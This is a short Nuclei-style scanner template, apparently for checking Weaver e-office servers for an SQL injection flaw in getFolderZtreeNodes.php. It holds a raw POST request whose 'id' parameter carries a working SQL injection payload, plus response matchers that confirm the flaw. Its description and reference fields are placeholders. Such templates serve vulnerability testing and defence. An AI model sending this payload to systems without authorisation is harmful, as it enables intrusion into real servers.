id: eoffice_getFolderZtreeNodes_sqli
info:
  name: 泛微getFolderZtreeNodes 存在SQL注入漏洞
  author: mhb17
  severity: critical
  description: description
  reference:
    - https://
  tags: sqli
http:
  - raw:
      - |-
        POST /general/system/file_folder/purview_new/getFolderZtreeNodes.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 613

        id=(SELECT (CASE WHEN (length(database())<0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - folder.class.php
      - type: word
        part: header
        words:
          - '302'
